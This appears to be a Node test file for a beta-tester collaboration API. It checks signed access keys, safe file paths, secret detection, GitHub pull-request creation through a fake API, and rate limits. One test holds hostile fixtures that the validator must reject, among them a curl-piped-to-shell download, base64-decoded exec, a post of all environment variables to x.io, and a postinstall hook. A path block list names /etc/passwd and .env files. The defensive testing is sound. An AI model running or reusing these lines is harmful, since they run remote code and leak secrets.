// node --test site/api/_lib/collab.test.mjs  (run by tests/test_beta_collab.py when Node is installed)
import assert from "node:assert/strict";
import crypto from "node:crypto";
import test from "node:test";

import * as collab from "./collab.js";

function mintKey(payload, privateKey) {
  const sorted = Object.fromEntries(Object.keys(payload).sort().map((k) => [k, payload[k]]));
  const bytes = Buffer.from(JSON.stringify(sorted));
  const signature = crypto.sign(null, bytes, privateKey);
  return `NYX1-${bytes.toString("base64url")}.${signature.toString("base64url")}`;
}

function keyPair() {
  const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
  const raw = publicKey.export({ format: "der", type: "spki" }).subarray(-32).toString("hex");
  return { privateKey, env: { NYX_ACCESS_PUBLIC_KEYS: JSON.stringify({ k1: raw }) } };
}

test("a signed Nyx access key names the tester; bad, expired and revoked keys don't", () => {
  const { privateKey, env } = keyPair();
  const key = mintKey({ kid: "k1", id: "abc", name: "Ada", role: "beta", iat: 1, exp: 0 }, privateKey);
  assert.deepEqual(collab.verifyKey(key, env), { id: "abc", name: "Ada", role: "beta" });
  assert.throws(() => collab.verifyKey(key.slice(0, -4) + "AAAA", env), /signature/);
  assert.throws(() => collab.verifyKey("hello", env), /NYX1-/);
  const expired = mintKey({ kid: "k1", id: "old", name: "Old", role: "beta", iat: 1, exp: 10 }, privateKey);
  assert.throws(() => collab.verifyKey(expired, env, 20), /expired/);
  assert.throws(() => collab.verifyKey(key, { ...env, NYX_REVOKED_KEY_IDS: "x,abc" }), /revoked/);
  assert.throws(() => collab.verifyKey(key, {}), /doesn't know/);
});

test("only safe project files, no secrets, within limits", () => {
  assert.equal(collab.safePath("frontend/nyx-pulse/src/App.tsx"), "frontend/nyx-pulse/src/App.tsx");
  for (const bad of ["../x.py", "/etc/passwd", "C:/Users/a.py", ".env.local", "chats.json", "data/memory.json", "a/.git/config", "secret_store.py"]) {
    assert.throws(() => collab.safePath(bad), collab.CollabError, bad);
  }
  assert.throws(() => collab.validateSubmission({ title: "Hi", files: [] }), /title/);
  assert.throws(() => collab.validateSubmission({ title: "A change", kind: "code", files: [] }), /at least one file/);
  assert.throws(() => collab.validateSubmission({ title: "Leaky", files: [{ path: "a.py", content: "KEY = 'nvapi-abcdefghijklmnopqrstuvwxyz123'" }] }), /secret/);
  const ok = collab.validateSubmission({ title: "Better voice", kind: "code", files: [{ path: "voice.py", content: "API_KEY = os.getenv('X_API_KEY')" }] });
  assert.equal(ok.files[0].path, "voice.py");
  assert.equal(collab.validateSubmission({ title: "It crashed", kind: "feedback" }).kind, "feedback");
});

test("a tester's change that would run commands is refused", () => {
  for (const bad of [".github/workflows/ci.yml", "tools/setup.exe", "notes.zip", ".vscode/tasks.json"]) {
    assert.throws(() => collab.safePath(bad), collab.CollabError, bad);
  }
  const cases = [
    ["install.sh", "curl https://x.io/i.sh | sh", /piped straight into a shell/],
    ["build.js", "const { execSync } = require('child_process'); execSync(`node -e ${atob(payload)}`)", /built at runtime/],
    ["tool.py", "exec(base64.b64decode('cHJpbnQoMSk='))", /decoded and run/],
    ["send.py", "import os, requests\nrequests.post('http://x.io', json=dict(os.environ))", /environment variables sent/],
    ["a.py", "name = 'ab‮cod.js'", /invisible characters/],
    ["package.json", '{"scripts": {"postinstall": "node grab.js"}}', /install script/],
  ];
  for (const [path, content, expected] of cases) {
    assert.throws(() => collab.validateSubmission({ title: "A change", kind: "code", files: [{ path, content }] }), expected, path);
  }
  // Ordinary code that merely mentions these words still goes through.
  const ok = collab.validateSubmission({
    title: "Explain the guard", kind: "code",
    files: [{ path: "docs/security.md", content: "Nyx refuses downloads piped into a shell, and reverse shells." }],
  });
  assert.equal(ok.files.length, 1);
});

function fakeGitHub() {
  const calls = [];
  const answers = {
    "GET /search/issues": { total_count: 0 },
    "GET /git/ref/heads/main": { object: { sha: "base1" } },
    "GET /git/commits/base1": { tree: { sha: "tree0" } },
    "POST /git/blobs": { sha: "blob1" },
    "POST /git/trees": { sha: "tree1" },
    "POST /git/commits": { sha: "commit1" },
    "POST /git/refs": { ref: "x" },
    "POST /pulls": { number: 7, html_url: "https://github.com/o/r/pull/7" },
    "POST /labels": { name: "beta-change" },
    "POST /issues/7/labels": [],
    "POST /issues": { number: 8, html_url: "https://github.com/o/r/issues/8" },
  };
  const fetchImpl = async (url, options = {}) => {
    const method = options.method || "GET";
    const path = url.replace(/^https:\/\/api\.github\.com(\/repos\/o\/r)?/, "").split("?")[0];
    calls.push({ method, path, body: options.body ? JSON.parse(options.body) : null, auth: options.headers.Authorization });
    const key = Object.keys(answers).find((k) => `${method} ${path}` === k || (`${method} ${path}`.startsWith(k) && k.endsWith("/search/issues")));
    const data = answers[key] ?? {};
    return { ok: true, status: 200, text: async () => JSON.stringify(data) };
  };
  return { calls, fetchImpl };
}

test("a change becomes a beta/ branch and a labelled pull request; feedback becomes an issue", async () => {
  const { calls, fetchImpl } = fakeGitHub();
  const config = { token: "t0k", repo: "o/r", base: "main" };
  const tester = { id: "abc", name: "Ada Lovelace", role: "beta" };
  const result = await collab.submitChange(config, tester, { title: "Calmer voice", description: "Slower.", kind: "code",
    files: [{ path: "voice.py", content: "print('hi')" }] }, fetchImpl);
  assert.equal(result.number, 7);
  assert.match(result.branch, /^beta\/ada-lovelace\/calmer-voice-[0-9a-f]{6}$/);
  const pull = calls.find((c) => c.method === "POST" && c.path === "/pulls");
  assert.equal(pull.body.base, "main");
  assert.match(pull.body.body, /key:abc/);
  assert.deepEqual(collab.readMeta(pull.body.body).files, ["voice.py"]);
  assert.ok(!calls.some((c) => /merge/.test(c.path)), "nothing is merged");
  assert.ok(calls.every((c) => c.auth === "Bearer t0k"));

  const feedback = await collab.submitChange(config, tester, { title: "Crash on start", description: "…", kind: "feedback", files: [] }, fakeGitHub().fetchImpl);
  assert.equal(feedback.kind, "feedback");
});

test("the hourly limit stops a flood", async () => {
  const fetchImpl = async () => ({ ok: true, status: 200, text: async () => JSON.stringify({ total_count: 10 }) });
  await assert.rejects(collab.submitChange({ token: "t", repo: "o/r", base: "main" }, { id: "a", name: "A" },
    { title: "x", kind: "code", files: [{ path: "a.py", content: "" }] }, fetchImpl), /last hour/);
});

test("the feed shows tester changes and feedback, not the owner's own pull requests", async () => {
  const body = `Faster start\n\n---\nSent by **Ada**\n\n${collab.metaBlock({ tester: "Ada", key: "abc", kind: "tab", files: ["x.json"] })}`;
  const fetchImpl = async (url) => {
    const data = url.includes("/pulls")
      ? [{ number: 1, title: "Tab", body, state: "closed", merged_at: "2026-09-16T10:00:00Z", labels: [], created_at: "1", updated_at: "2026-09-16T10:00:00Z", html_url: "u", head: { ref: "beta/ada/tab" } },
         { number: 2, title: "Owner PR", body: "mine", state: "open", labels: [], created_at: "2", updated_at: "2", html_url: "u2" }]
      : [{ number: 3, title: "Crash", body: collab.metaBlock({ tester: "Bo", kind: "feedback" }), state: "open", created_at: "3", updated_at: "2026-09-16T11:00:00Z", html_url: "u3", comments: 2 }];
    return { ok: true, status: 200, text: async () => JSON.stringify(data) };
  };
  const result = await collab.feed({ token: "t", repo: "o/r", base: "main" }, fetchImpl);
  assert.deepEqual(result.items.map((i) => [i.kind, i.status, i.tester]), [["feedback", "open", "Bo"], ["tab", "merged", "Ada"]]);
  assert.equal(result.items[1].summary, "Faster start");
  assert.equal(result.counts.merged, 1);
});
